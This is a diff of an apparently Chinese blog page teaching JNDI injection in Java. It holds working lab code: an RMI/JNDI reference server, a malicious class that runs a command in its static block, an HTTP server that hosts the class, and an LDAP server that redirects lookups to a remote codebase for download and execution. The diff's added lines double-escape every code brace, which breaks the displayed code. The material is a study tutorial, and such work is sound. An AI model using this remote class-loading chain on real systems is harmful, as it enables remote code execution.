@@ -104,7 +104,7 @@
      --><!--
        --><li><a href="/categories/">分类</a></li><!--
      --><!--
-       --><li><a href="/%E5%8F%8B%E4%BA%BA%E9%93%BA/">友链</a></li><!--
+       --><li><a href="/friends/">友链</a></li><!--
      -->
       </ul>
     </span>
@@ -211,13 +211,13 @@
 
 
 
-<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">JNDIServer</span> <span class="token punctuation">{</span>
-    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception<span class="token punctuation">{</span>
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">JNDIServer</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception<span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>
         LocateRegistry<span class="token punctuation">.</span><span class="token function">createRegistry</span><span class="token punctuation">(</span><span class="token number">1099</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
         InitialContext initialContext <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InitialContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
         initialContext<span class="token punctuation">.</span><span class="token function">rebind</span><span class="token punctuation">(</span><span class="token string">"rmi://localhost:1099/remoteObj"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">RemoteObjImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token punctuation">}</span>
-<span class="token punctuation">}</span>
+    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>
+<span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>
 </code></pre>
 <pre class=" language-xml"><code class="language-xml">代码逻辑：
 1.创建注册中心
@@ -231,13 +231,13 @@
 <span class="token keyword">import</span> java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>RemoteException<span class="token punctuation">;</span>
 
 
-<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">RMIClient</span> <span class="token punctuation">{</span>
-    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception<span class="token punctuation">,</span> RemoteException <span class="token punctuation">{</span>
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">RMIClient</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception<span class="token punctuation">,</span> RemoteException <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>
         InitialContext initialContext <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InitialContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
         IRemoteObj remoteObj <span class="token operator">=</span> <span class="token punctuation">(</span>IRemoteObj<span class="token punctuation">)</span> initialContext<span class="token punctuation">.</span><span class="token function">lookup</span><span class="token punctuation">(</span><span class="token string">"rmi://localhost:1099/remoteObj"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
         System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>remoteObj<span class="token punctuation">.</span><span class="token function">sayHello</span><span class="token punctuation">(</span><span class="token string">"hello"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token punctuation">}</span>
-<span class="token punctuation">}</span>
+    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>
+<span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>
 </code></pre>
 <p>如此就完成了最简单的Server端与Client端交互</p>
 <p>现在假设这样一个场景：</p>
@@ -254,11 +254,11 @@
 首先介绍一下 这个引用对象​`Reference类`​的构造函数：
 </code></pre>
 <pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token function">Reference</span><span class="token punctuation">(</span>String className<span class="token punctuation">,</span> RefAddr addr<span class="token punctuation">,</span>
-                     String factory<span class="token punctuation">,</span> String factoryLocation<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                     String factory<span class="token punctuation">,</span> String factoryLocation<span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>
         <span class="token keyword">this</span><span class="token punctuation">(</span>className<span class="token punctuation">,</span> addr<span class="token punctuation">)</span><span class="token punctuation">;</span>
         classFactory <span class="token operator">=</span> factory<span class="token punctuation">;</span>
         classFactoryLocation <span class="token operator">=</span> factoryLocation<span class="token punctuation">;</span>
-    <span class="token punctuation">}</span>
+    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>
 </code></pre>
 <pre class=" language-xml"><code class="language-xml">className 类名
 factory 工厂名
@@ -274,16 +274,16 @@ factoryLocation工厂路径
 
 
 
-<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">JNDIServer</span> <span class="token punctuation">{</span>
-    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception<span class="token punctuation">{</span>
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">JNDIServer</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception<span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>
         LocateRegistry<span class="token punctuation">.</span><span class="token function">createRegistry</span><span class="token punctuation">(</span><span class="token number">1099</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
         InitialContext initialContext <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InitialContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token comment" spellcheck="true">//        initialContext.rebind("rmi://localhost:1099/remoteObj", new RemoteObjImpl());</span>
         Reference reference <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Reference</span><span class="token punctuation">(</span><span class="token string">"TestRef"</span><span class="token punctuation">,</span> <span class="token string">"TestRef"</span><span class="token punctuation">,</span> <span class="token string">"http://localhost:9999/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
         initialContext<span class="token punctuation">.</span><span class="token function">rebind</span><span class="token punctuation">(</span><span class="token string">"rmi://localhost:1099/remoteObj"</span><span class="token punctuation">,</span> reference<span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token punctuation">}</span>
-<span class="token punctuation">}</span>
+    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>
+<span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>
 </code></pre>
 <p>注意​<code>initialContext.rebind(&quot;rmi://localhost:1099/remoteObj&quot;, reference);</code>​中是绑定到RMI服务上面，不是使用http协议</p>
 <p>JNDIClient:</p>
@@ -293,26 +293,26 @@ factoryLocation工厂路径
 <span class="token keyword">import</span> java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>RemoteException<span class="token punctuation">;</span>
 
 
-<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">RMIClient</span> <span class="token punctuation">{</span>
-    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception<span class="token punctuation">,</span> RemoteException <span class="token punctuation">{</span>
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">RMIClient</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception<span class="token punctuation">,</span> RemoteException <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>
         InitialContext initialContext <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InitialContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
         IRemoteObj remoteObj <span class="token operator">=</span> <span class="token punctuation">(</span>IRemoteObj<span class="token punctuation">)</span> initialContext<span class="token punctuation">.</span><span class="token function">lookup</span><span class="token punctuation">(</span><span class="token string">"rmi://localhost:1099/remoteObj"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
         System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>remoteObj<span class="token punctuation">.</span><span class="token function">sayHello</span><span class="token punctuation">(</span><span class="token string">"hello"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token punctuation">}</span>
-<span class="token punctuation">}</span>
+    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>
+<span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>
 </code></pre>
 <p>然后预先编译好一个恶意类：(注意这个要加载的恶意类不能有package之类的，这样子到时候无法执行)</p>
 <pre class=" language-java"><code class="language-java"><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>IOException<span class="token punctuation">;</span>
 
-<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">TestRef</span> <span class="token punctuation">{</span>
-    <span class="token keyword">static</span> <span class="token punctuation">{</span>
-        <span class="token keyword">try</span> <span class="token punctuation">{</span>
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">TestRef</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>
+    <span class="token keyword">static</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>
+        <span class="token keyword">try</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>
             Runtime<span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"calc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>
             e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token punctuation">}</span>
-    <span class="token punctuation">}</span>
-<span class="token punctuation">}</span>
+        <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>
+    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>
+<span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>
 </code></pre>
 <h2 id="演示步骤："><a href="#演示步骤：" class="headerlink" title="演示步骤："></a>演示步骤：</h2><p>1.将编译好的恶意类放在一个目录下，并启动http服务：<br>​<code>python -m http.server 9999</code>​<br>​​<img src="/Blogimages/JNDI%E6%B3%A8%E5%85%A5/2.png">​​<br>2.开启JNDIServer服务<br>3.允许Client<br>效果：<br>​​<img src="/Blogimages/JNDI%E6%B3%A8%E5%85%A5/image-20230420202927-v7nlw3a.png">​​</p>
 <pre class=" language-ps"><code class="language-ps">PS:这里没有报错是因为没有找到remote.sayHello
@@ -335,13 +335,13 @@ factoryLocation工厂路径
 <span class="token keyword">import</span> java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>RemoteException<span class="token punctuation">;</span>
 
 
-<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">RMIClient</span> <span class="token punctuation">{</span>
-    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception<span class="token punctuation">,</span> RemoteException <span class="token punctuation">{</span>
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">RMIClient</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception<span class="token punctuation">,</span> RemoteException <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>
         InitialContext initialContext <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InitialContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
         IRemoteObj remoteObj <span class="token operator">=</span> <span class="token punctuation">(</span>IRemoteObj<span class="token punctuation">)</span> initialContext<span class="token punctuation">.</span><span class="token function">lookup</span><span class="token punctuation">(</span><span class="token string">"ldap://localhost:8888/TestRef"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
         System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>remoteObj<span class="token punctuation">.</span><span class="token function">sayHello</span><span class="token punctuation">(</span><span class="token string">"hello"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token punctuation">}</span>
-<span class="token punctuation">}</span>
+    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>
+<span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>
 <span class="token comment" spellcheck="true">//8u141</span>
 </code></pre>
 <p>环境先搭好，8u121之前就只剩下一个LDAP方式可以利用攻击了，所以要有一个LDAP服务器<br>推荐两种方式：</p>
@@ -368,15 +368,15 @@ factoryLocation工厂路径
 <span class="token keyword">import</span> com<span class="token punctuation">.</span>unboundid<span class="token punctuation">.</span>ldap<span class="token punctuation">.</span>sdk<span class="token punctuation">.</span>LDAPResult<span class="token punctuation">;</span>
 <span class="token keyword">import</span> com<span class="token punctuation">.</span>unboundid<span class="token punctuation">.</span>ldap<span class="token punctuation">.</span>sdk<span class="token punctuation">.</span>ResultCode<span class="token punctuation">;</span>
 
-<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">LDAPRefServer</span> <span class="token punctuation">{</span>
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">LDAPRefServer</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>
 
     <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> String LDAP_BASE <span class="token operator">=</span> <span class="token string">"dc=example,dc=com"</span><span class="token punctuation">;</span>
 
-    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span> <span class="token punctuation">(</span> String<span class="token punctuation">[</span><span class="token punctuation">]</span> tmp_args <span class="token punctuation">)</span> <span class="token punctuation">{</span>
-        String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"http://192.168.43.88/#test"</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span> <span class="token punctuation">(</span> String<span class="token punctuation">[</span><span class="token punctuation">]</span> tmp_args <span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>
+        String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span><span class="token string">"http://192.168.43.88/#test"</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token punctuation">;</span>
         <span class="token keyword">int</span> port <span class="token operator">=</span> <span class="token number">7777</span><span class="token punctuation">;</span>
 
-        <span class="token keyword">try</span> <span class="token punctuation">{</span>
+        <span class="token keyword">try</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>
             InMemoryDirectoryServerConfig config <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InMemoryDirectoryServerConfig</span><span class="token punctuation">(</span>LDAP_BASE<span class="token punctuation">)</span><span class="token punctuation">;</span>
             config<span class="token punctuation">.</span><span class="token function">setListenerConfigs</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">InMemoryListenerConfig</span><span class="token punctuation">(</span>
                     <span class="token string">"listen"</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">//$NON-NLS-1$</span>
@@ -391,49 +391,49 @@ factoryLocation工厂路径
             System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Listening on 0.0.0.0:"</span> <span class="token operator">+</span> port<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//$NON-NLS-1$</span>
             ds<span class="token punctuation">.</span><span class="token function">startListening</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
-        <span class="token punctuation">}</span>
-        <span class="token keyword">catch</span> <span class="token punctuation">(</span> Exception e <span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>
+        <span class="token keyword">catch</span> <span class="token punctuation">(</span> Exception e <span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>
             e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token punctuation">}</span>
-    <span class="token punctuation">}</span>
+        <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>
+    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>
 
-    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">class</span> <span class="token class-name">OperationInterceptor</span> <span class="token keyword">extends</span> <span class="token class-name">InMemoryOperationInterceptor</span> <span class="token punctuation">{</span>
+    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">class</span> <span class="token class-name">OperationInterceptor</span> <span class="token keyword">extends</span> <span class="token class-name">InMemoryOperationInterceptor</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>
 
         <span class="token keyword">private</span> URL codebase<span class="token punctuation">;</span>
 
-        <span class="token keyword">public</span> <span class="token function">OperationInterceptor</span> <span class="token punctuation">(</span> URL cb <span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">public</span> <span class="token function">OperationInterceptor</span> <span class="token punctuation">(</span> URL cb <span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>
             <span class="token keyword">this</span><span class="token punctuation">.</span>codebase <span class="token operator">=</span> cb<span class="token punctuation">;</span>
-        <span class="token punctuation">}</span>
+        <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>
 
         <span class="token annotation punctuation">@Override</span>
-        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">processSearchResult</span> <span class="token punctuation">(</span> InMemoryInterceptedSearchResult result <span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">processSearchResult</span> <span class="token punctuation">(</span> InMemoryInterceptedSearchResult result <span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>
             String base <span class="token operator">=</span> result<span class="token punctuation">.</span><span class="token function">getRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getBaseDN</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
             Entry e <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Entry</span><span class="token punctuation">(</span>base<span class="token punctuation">)</span><span class="token punctuation">;</span>
-            <span class="token keyword">try</span> <span class="token punctuation">{</span>
+            <span class="token keyword">try</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>
                 <span class="token function">sendResult</span><span class="token punctuation">(</span>result<span class="token punctuation">,</span> base<span class="token punctuation">,</span> e<span class="token punctuation">)</span><span class="token punctuation">;</span>
-            <span class="token punctuation">}</span>
-            <span class="token keyword">catch</span> <span class="token punctuation">(</span> Exception e1 <span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>
+            <span class="token keyword">catch</span> <span class="token punctuation">(</span> Exception e1 <span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>
                 e1<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-            <span class="token punctuation">}</span>
-        <span class="token punctuation">}</span>
+            <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>
+        <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>
 
-        <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">sendResult</span> <span class="token punctuation">(</span> InMemoryInterceptedSearchResult result<span class="token punctuation">,</span> String base<span class="token punctuation">,</span> Entry e <span class="token punctuation">)</span> <span class="token keyword">throws</span> LDAPException<span class="token punctuation">,</span> MalformedURLException <span class="token punctuation">{</span>
+        <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">sendResult</span> <span class="token punctuation">(</span> InMemoryInterceptedSearchResult result<span class="token punctuation">,</span> String base<span class="token punctuation">,</span> Entry e <span class="token punctuation">)</span> <span class="token keyword">throws</span> LDAPException<span class="token punctuation">,</span> MalformedURLException <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>
             URL turl <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>codebase<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>codebase<span class="token punctuation">.</span><span class="token function">getRef</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">,</span> <span class="token string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token string">".class"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
             System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Send LDAP reference result for "</span> <span class="token operator">+</span> base <span class="token operator">+</span> <span class="token string">" redirecting to "</span> <span class="token operator">+</span> turl<span class="token punctuation">)</span><span class="token punctuation">;</span>
             e<span class="token punctuation">.</span><span class="token function">addAttribute</span><span class="token punctuation">(</span><span class="token string">"javaClassName"</span><span class="token punctuation">,</span> <span class="token string">"foo"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
             String cbstring <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>codebase<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
             <span class="token keyword">int</span> refPos <span class="token operator">=</span> cbstring<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">'#'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-            <span class="token keyword">if</span> <span class="token punctuation">(</span> refPos <span class="token operator">></span> <span class="token number">0</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token keyword">if</span> <span class="token punctuation">(</span> refPos <span class="token operator">></span> <span class="token number">0</span> <span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>
                 cbstring <span class="token operator">=</span> cbstring<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> refPos<span class="token punctuation">)</span><span class="token punctuation">;</span>
-            <span class="token punctuation">}</span>
+            <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>
             e<span class="token punctuation">.</span><span class="token function">addAttribute</span><span class="token punctuation">(</span><span class="token string">"javaCodeBase"</span><span class="token punctuation">,</span> cbstring<span class="token punctuation">)</span><span class="token punctuation">;</span>
             e<span class="token punctuation">.</span><span class="token function">addAttribute</span><span class="token punctuation">(</span><span class="token string">"objectClass"</span><span class="token punctuation">,</span> <span class="token string">"javaNamingReference"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//$NON-NLS-1$</span>
             e<span class="token punctuation">.</span><span class="token function">addAttribute</span><span class="token punctuation">(</span><span class="token string">"javaFactory"</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>codebase<span class="token punctuation">.</span><span class="token function">getRef</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
             result<span class="token punctuation">.</span><span class="token function">sendSearchEntry</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span>
             result<span class="token punctuation">.</span><span class="token function">setResult</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">LDAPResult</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> ResultCode<span class="token punctuation">.</span>SUCCESS<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token punctuation">}</span>
-    <span class="token punctuation">}</span>
-<span class="token punctuation">}</span>
+        <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>
+    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>
+<span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>
 
 <span class="token comment" spellcheck="true">//记得添加依赖：</span>
 <span class="token comment" spellcheck="true">/*
@@ -457,36 +457,36 @@ factoryLocation工厂路径
 </code></pre>
 <p>​​<img src="/Blogimages/JNDI%E6%B3%A8%E5%85%A5/4.png">​​<br>如果接收到http服务，这里会显示​<code>Listening on 0.0.0.0:8888</code>​<br>运行效果：(8u141)<br>​​​<img src="/Blogimages/JNDI%E6%B3%A8%E5%85%A5/image-20230420210922-zd6tblv.png">​​​</p>
 <h3 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h3><p>在​<code>lookup</code>​这里下个断点进去找<br>前面都一路跟着​<code>lookup</code>​，一直到<code>c_lookup</code>​进入到<code>类ldapctx</code>​里面<br>进入到一处：</p>
-<pre class=" language-java"><code class="language-java"><span class="token keyword">if</span> <span class="token punctuation">(</span>attrs<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>Obj<span class="token punctuation">.</span>JAVA_ATTRIBUTES<span class="token punctuation">[</span>Obj<span class="token punctuation">.</span>CLASSNAME<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+<pre class=" language-java"><code class="language-java"><span class="token keyword">if</span> <span class="token punctuation">(</span>attrs<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>Obj<span class="token punctuation">.</span>JAVA_ATTRIBUTES<span class="token punctuation">[</span>Obj<span class="token punctuation">.</span>CLASSNAME<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>
                 <span class="token comment" spellcheck="true">// serialized object or object reference</span>
